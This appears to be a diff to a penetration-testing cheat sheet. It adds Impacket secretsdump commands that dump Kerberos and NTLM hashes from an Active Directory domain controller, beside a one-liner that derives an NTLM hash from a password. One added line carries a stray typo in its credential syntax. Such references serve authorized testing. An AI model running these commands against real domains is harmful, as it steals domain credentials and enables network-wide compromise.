@@ -286,9 +286,18 @@ To get NTLM from password:
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 ```
 Dumping Hash of NTDS.DIT
-```python
-python secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
+
+Dumping kerberos and ntlm hash
 ```
+python secretsdump.py -just-dc <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
+python secretsdump.py -just-dc <user>:<password>d@<ip>
+```
+Dumping NTLM Hash Only
+```
+python secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
+python secretsdump.py -just-dc-ntlm <user>:<password>d@<ip>
+```
+
 ## Tools
 
 * [Impacket](https://github.com/SecureAuthCorp/impacket)
